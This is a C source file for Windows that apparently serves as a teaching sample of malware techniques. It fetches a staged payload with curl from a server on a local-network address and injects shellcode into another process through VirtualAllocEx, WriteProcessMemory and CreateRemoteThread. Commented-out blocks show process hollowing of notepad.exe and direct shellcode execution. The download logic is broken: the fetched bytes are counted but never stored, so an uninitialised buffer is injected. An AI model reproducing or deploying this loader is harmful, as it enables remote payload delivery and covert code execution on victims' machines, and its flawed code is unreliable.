#include <stdio.h>
#include <windows.h>

int main(int argc,char *argv[]){	
	
	//this code snippet explains a staged payload.
	
	FILE *fpipe;
	char *cmd = "curl --silent http://192.168.1.17:8080/code.bin"; // change to desired server ip and port number
	char c=0;
	unsigned char shellcode[510]; //you have to specify shellcode size 
	int counter=0;
	
	//execute the curl cmd and pipe the result to fpipe descriptor
	
	if( (fpipe=(FILE*)(_popen(cmd,"r"))) == NULL ){
		perror("[x] popen() failed..\n");
		exit(EXIT_FAILURE);
	}
	
	while(fread(&c,sizeof(c),1,fpipe)){
		//debug
		//printf("%c",c);
		//end debug
		counter=counter + 1;
	}
	printf("\n[+] shellcode size %d bytes\n",counter);
	shellcode[counter];

	//debug
	/*
	for(int i=0; i < sizeof(shellcode); ++i){
		printf("%c",shellcode[i]);
	}
	system("pause");
	*/
	//end debug
	
	
	//this code snippet explains how process injection works
	DWORD PID;
	PID=atoi(argv[1]);
	
	HANDLE hProcess;
	HANDLE hThread;
	HANDLE hVictimThread;
	void *exec_mem;
	
	printf("[+] trying to open a handle to process (%ld)\n",PID);
	hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,PID);
	if(hProcess==NULL){
		printf("[x] Failed to get handle to process,error (%ld)\n",GetLastError());
		exit(1);
	}
	printf("[+] GOT HANDLE TO VICTIM PROCESS!\n");	
	exec_mem=VirtualAllocEx(hProcess,NULL,sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);	
	WriteProcessMemory(hProcess,exec_mem,shellcode,sizeof(shellcode),NULL);
	printf("[+] trying to open a remote thread (%ld)\n",PID);
	hThread=CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE) exec_mem,NULL,0,0);
	if(hThread==NULL){
		printf("[x] Failed to get handle to process,error (%ld)\n",GetLastError());
		CloseHandle(hProcess);
		exit(1);
	}
	printf("[+] GOT HANDLE TO THREAD!\n");
	WaitForSingleObject(hThread, INFINITE);
	printf("[+] cleaning up..\n");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	
	/*
	//this code snippet explains how process hollowing works
	
	
	void *exec_mem;
	STARTUPINFOA *startupinfo=malloc(1*sizeof(STARTUPINFOA));
	PROCESS_INFORMATION *procinfo=malloc(1*sizeof(PROCESS_INFORMATION));
    ZeroMemory(startupinfo, sizeof(STARTUPINFOA));
    ZeroMemory(procinfo, sizeof(PROCESS_INFORMATION));
	if(CreateProcessA("C:\\Windows\\notepad.exe",NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,startupinfo,procinfo) == 0){
		printf("[x] Failed to create process,error (%ld)\n",GetLastError());
		exit(1);			
	};
	// hProcess.procinfo -> handle
	exec_mem=VirtualAllocEx(procinfo->hProcess,NULL,sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(procinfo->hProcess,exec_mem,shellcode,sizeof(shellcode),NULL);
	if (ResumeThread(procinfo->hThread) == -1){
		printf("[x] Failed to resume process,error (%ld)\n",GetLastError());
		exit(1);		
	}
	
	free(startupinfo);
	free(procinfo);
	
	*/
	
	
	
	/*
	//this code snippet explains how shellcode execution works
	//we won't need it cause we already injecting a process.
	
	void *exec=VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	printf("[+] memcpy\n");
	memcpy(exec,shellcode,sizeof(shellcode));
	//RtlMoveMemory(exec,shellcode,sizeof(shellcode));
	printf("[+] memcpy success\n");
	((void(*)())exec)(); //exec shellcode
	
	//printf("[+] create thread");

	
	if ( CreateThread(NULL,0,(LPTHREAD_START_ROUTINE) exec,NULL,0,NULL) == NULL){printf("[x] THREAD FAILED.\n");}
	printf("[+] thread created\n");
	printf("[+]EXECUTION SUCCEEDED\n");
	*/
	
	return 0;
}